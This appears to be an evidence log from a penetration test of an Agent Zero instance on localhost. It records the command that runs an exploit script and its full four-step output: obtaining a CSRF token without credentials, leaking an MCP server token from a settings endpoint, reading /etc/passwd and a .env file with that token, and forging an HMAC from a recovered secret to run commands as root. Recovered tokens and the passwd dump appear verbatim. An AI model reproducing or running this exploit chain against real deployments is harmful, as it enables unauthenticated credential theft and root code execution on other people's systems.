@@ -1,0 +1,58 @@
+# E-004  (hypothesis undefined)
+command: bash /root/渗透测试/repo-agent-zero-rce/poc/exploit.sh http://127.0.0.1:50001 /etc/passwd /root/渗透测试/recon/az/usr/.env 2>&1
+expect: 四环全部成功：环1 无凭据得 csrf_token；环2 settings_get 明文下发 mcp_server_token；环3 用该 token 读到 /etc/passwd 与 usr/.env；环4 用 RFC_PASSWORD 算 HMAC 打 /api/rfc 返回 uid=0(root)
+repeat: 1  stability: single-run
+toolFailureMarkers: none
+
+--- run 1 | exit 0 | 2095ms | aborted=false
+[*] target : http://127.0.0.1:50001
+
+[1/4] GET /api/csrf_token  (no credentials)
+      csrf_token = CAN3PejWtRC7EIMgstxpoB7G35T5N81hV6zDxVZEp2g
+
+[2/4] POST /api/settings_get  (no credentials)
+      mcp_server_token = gffytvvgDV-Pyr07
+
+[3/4] POST /api/api_files_get  (X-API-KEY from step 2)
+----- passwd (3296 bytes) -----
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:997:997:systemd Network Management:/:/usr/sbin/nologin
+_dhcpcd:x:995:995:DHCP Client Daemon:/var/lib/dhcpcd:/sbin/nologin
+systemd-timesync:x:989:989:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:988:988:System Message Bus:/nonexistent:/usr/sbin/nologin
+tss:x:986:986:tss user for tpm2:/:/usr/sbin/nologin
+strongswan:x:100:65534::/var/lib/strongswan:/usr/sbin/nologin
+tcpdump:x:985:985:tcpdump:/nonexistent:/usr/sbin/nologin
+sshd:x:984:65534:sshd user:/run/sshd:/usr/sbin/nologin
+_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:102:65534::/var/lib/nfs:/usr/sbin/nologin
+dnsmasq:x:983:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+avahi:x:103:104:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologin
+nm-openvpn:x:981:981:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
+speech-dispatcher:x:980:980:Speech Dispatcher:/run/speech-dispatcher:/bin/false
+usbmux:x:104:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
+nm-openconnect:x:979:979:NetworkManager OpenConnect plugin:/:/usr/sbin/nologin
+pipewire:x:978:978:system user for pipewire:/nonexistent:/usr/sbin/nologin
+saned:x:105:105::/var/lib/saned:
+
+[4/4] POST /api/rfc  (no credentials; HMAC key read from /root/渗透测试/recon/az/usr/.env)
+      RFC_PASSWORD recovered: rfc_secret_abc123
+      HTTP 200 -> "uid=0(root) gid=0(root) groups=0(root)\nzsh"
+
